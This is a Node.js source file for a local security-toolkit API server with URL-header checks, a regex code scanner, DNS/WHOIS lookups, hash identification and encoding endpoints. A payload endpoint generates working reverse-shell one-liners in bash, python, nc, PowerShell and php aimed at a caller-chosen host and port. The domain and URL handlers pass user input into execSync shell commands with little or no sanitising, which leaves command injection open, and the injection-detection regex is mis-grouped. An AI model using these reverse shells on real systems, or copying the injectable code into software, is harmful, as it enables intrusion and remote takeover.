const http = require('http');
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const DEFAULT_PORT = 3117;
const API_KEY_FILE = path.join(process.env.HOME || '/tmp', '.sentinel', 'api-key');

function getApiKey() {
  const dir = path.dirname(API_KEY_FILE);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  if (fs.existsSync(API_KEY_FILE)) return fs.readFileSync(API_KEY_FILE, 'utf8').trim();
  const key = 'sk-sentinel-' + crypto.randomBytes(16).toString('hex');
  fs.writeFileSync(API_KEY_FILE, key, { mode: 0o600 });
  return key;
}

function authenticate(req, apiKey) {
  const provided = req.headers['x-api-key'] || req.headers['authorization']?.replace('Bearer ', '');
  return provided === apiKey;
}

function parseBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try { resolve(JSON.parse(body || '{}')); }
      catch(e) { reject(e); }
    });
  });
}

const routes = {
  'GET /api/v1/health': async () => ({
    ok: true, version: require('../../package.json').version || '2.44.0',
    engine: 'sentinel-nexus', timestamp: new Date().toISOString()
  }),

  'POST /api/v1/scan/url': async (body) => {
    const { url } = body;
    if (!url) return { error: 'url is required' };
    const results = { url, checks: [] };
    try {
      const headers = execSync(`curl -sI -m 10 "${url.replace(/"/g, '')}" 2>/dev/null | head -30`, { encoding: 'utf8', timeout: 15000 });
      const missing = [];
      if (!headers.match(/content-security-policy/i)) missing.push('Content-Security-Policy');
      if (!headers.match(/strict-transport-security/i)) missing.push('Strict-Transport-Security');
      if (!headers.match(/x-frame-options/i)) missing.push('X-Frame-Options');
      if (!headers.match(/x-content-type-options/i)) missing.push('X-Content-Type-Options');
      results.checks.push({ check: 'security-headers', missing, severity: missing.length > 2 ? 'high' : 'medium' });
      const server = headers.match(/^server:\s*(.+)/im);
      if (server) results.checks.push({ check: 'server-disclosure', value: server[1].trim(), severity: 'low' });
      results.checks.push({ check: 'https', enabled: url.startsWith('https'), severity: url.startsWith('https') ? 'info' : 'high' });
    } catch(e) { results.checks.push({ check: 'connection', error: e.message, severity: 'error' }); }
    return results;
  },

  'POST /api/v1/scan/code': async (body) => {
    const { code, language } = body;
    if (!code) return { error: 'code is required' };
    const findings = [];
    const lines = code.split('\n');
    lines.forEach((line, i) => {
      if (/['"].*\+.*['"].*(?:SELECT|INSERT|UPDATE|DELETE|WHERE)/i.test(line))
        findings.push({ line: i+1, type: 'sql-injection', severity: 'critical', message: 'Possible SQL injection — use parameterized queries' });
      if (/(?:exec|system|popen|eval|child_process)\s*\(.*\$|.*\+/i.test(line))
        findings.push({ line: i+1, type: 'command-injection', severity: 'critical', message: 'Possible command injection — validate/escape input' });
      if (/(?:password|secret|api_key|token)\s*[:=]\s*['"][^'"]{8,}/i.test(line))
        findings.push({ line: i+1, type: 'hardcoded-secret', severity: 'high', message: 'Hardcoded secret detected' });
      if (/innerHTML\s*=|document\.write\(|\.html\(/i.test(line))
        findings.push({ line: i+1, type: 'xss', severity: 'medium', message: 'Potential XSS — sanitize before inserting into DOM' });
      if (/\b(?:md5|sha1)\b/i.test(line) && /password|hash/i.test(line))
        findings.push({ line: i+1, type: 'weak-crypto', severity: 'medium', message: 'Weak hash algorithm — use bcrypt/argon2 for passwords' });
    });
    return { language: language || 'auto', lines: lines.length, findings, summary: `${findings.length} issue(s) found` };
  },

  'POST /api/v1/osint/domain': async (body) => {
    const { domain } = body;
    if (!domain) return { error: 'domain is required' };
    const results = { domain, data: {} };
    try { results.data.dns_a = execSync(`dig +short A ${domain} 2>/dev/null`, { encoding: 'utf8', timeout: 10000 }).trim().split('\n').filter(Boolean); } catch(e) {}
    try { results.data.dns_mx = execSync(`dig +short MX ${domain} 2>/dev/null`, { encoding: 'utf8', timeout: 10000 }).trim().split('\n').filter(Boolean); } catch(e) {}
    try { results.data.dns_ns = execSync(`dig +short NS ${domain} 2>/dev/null`, { encoding: 'utf8', timeout: 10000 }).trim().split('\n').filter(Boolean); } catch(e) {}
    try { results.data.dns_txt = execSync(`dig +short TXT ${domain} 2>/dev/null`, { encoding: 'utf8', timeout: 10000 }).trim().split('\n').filter(Boolean); } catch(e) {}
    try {
      const whois = execSync(`whois ${domain} 2>/dev/null | head -30`, { encoding: 'utf8', timeout: 15000 });
      const registrar = whois.match(/Registrar:\s*(.+)/i);
      const created = whois.match(/Creation Date:\s*(.+)/i);
      results.data.whois = { registrar: registrar?.[1]?.trim(), created: created?.[1]?.trim() };
    } catch(e) {}
    return results;
  },

  'POST /api/v1/osint/email': async (body) => {
    const { email } = body;
    if (!email) return { error: 'email is required' };
    return { email, note: 'Breach checking requires HIBP API key. Set HIBP_API_KEY env var.', breaches: [] };
  },

  'POST /api/v1/hash/identify': async (body) => {
    const { hash } = body;
    if (!hash) return { error: 'hash is required' };
    const len = hash.length;
    const types = [];
    if (len === 32) types.push('MD5', 'NTLM');
    if (len === 40) types.push('SHA-1');
    if (len === 64) types.push('SHA-256');
    if (len === 128) types.push('SHA-512');
    if (/^\$2[aby]\$/.test(hash)) types.push('bcrypt');
    if (/^\$6\$/.test(hash)) types.push('SHA-512 crypt');
    if (/^\$1\$/.test(hash)) types.push('MD5 crypt');
    return { hash: hash.substring(0, 16) + '...', length: len, possible_types: types };
  },

  'POST /api/v1/encode': async (body) => {
    const { data, method, direction } = body;
    if (!data || !method) return { error: 'data and method are required' };
    const decode = direction === 'decode';
    let result;
    switch (method) {
      case 'base64': result = decode ? Buffer.from(data, 'base64').toString() : Buffer.from(data).toString('base64'); break;
      case 'hex': result = decode ? Buffer.from(data, 'hex').toString() : Buffer.from(data).toString('hex'); break;
      case 'url': result = decode ? decodeURIComponent(data) : encodeURIComponent(data); break;
      default: return { error: 'method must be: base64, hex, url' };
    }
    return { input: data, method, direction: direction || 'encode', result };
  },

  'POST /api/v1/generate/payload': async (body) => {
    const { type, lhost, lport } = body;
    if (!lhost || !lport) return { error: 'lhost and lport are required' };
    const shells = {
      'bash': `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
      'python': `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn("/bin/bash")'`,
      'nc': `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`,
      'powershell': `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${lhost}',${lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"`,
      'php': `php -r '$s=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    };
    const t = type || 'bash';
    if (!shells[t]) return { error: `type must be: ${Object.keys(shells).join(', ')}` };
    return { type: t, lhost, lport, payload: shells[t], listener: `nc -nlvp ${lport}` };
  },

  'POST /api/v1/ai/ask': async (body) => {
    const { question } = body;
    if (!question) return { error: 'question is required' };
    return { question, note: 'AI responses require a running Ollama or Claude API key configured.', answer: null };
  },
};

function startServer(port) {
  const apiKey = getApiKey();
  const p = port || DEFAULT_PORT;

  const server = http.createServer(async (req, res) => {
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-API-Key, Authorization');

    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

    const routeKey = `${req.method} ${req.url.split('?')[0]}`;

    if (routeKey === 'GET /api/v1/health') {
      const result = await routes[routeKey]();
      res.writeHead(200);
      res.end(JSON.stringify(result));
      return;
    }

    if (!authenticate(req, apiKey)) {
      res.writeHead(401);
      res.end(JSON.stringify({ error: 'Invalid or missing API key. Include X-API-Key header.' }));
      return;
    }

    const handler = routes[routeKey];
    if (!handler) {
      res.writeHead(404);
      res.end(JSON.stringify({ error: 'Not found', available: Object.keys(routes) }));
      return;
    }

    try {
      const body = req.method === 'POST' ? await parseBody(req) : {};
      const result = await handler(body);
      res.writeHead(result.error ? 400 : 200);
      res.end(JSON.stringify(result, null, 2));
    } catch(e) {
      res.writeHead(500);
      res.end(JSON.stringify({ error: e.message }));
    }
  });

  server.listen(p, '127.0.0.1', () => {
    console.log(`\n  Darknode API server running on http://127.0.0.1:${p}`);
    console.log(`  API key: ${apiKey}`);
    console.log(`\n  Endpoints:`);
    Object.keys(routes).forEach(r => console.log(`    ${r}`));
    console.log(`\n  Test: curl http://127.0.0.1:${p}/api/v1/health`);
    console.log(`  Docs: curl -H "X-API-Key: ${apiKey}" http://127.0.0.1:${p}/api/v1/scan/url -d '{"url":"https://example.com"}'`);
    console.log(`\n  Press Ctrl+C to stop.\n`);
  });

  return server;
}

module.exports = { startServer, getApiKey, DEFAULT_PORT };
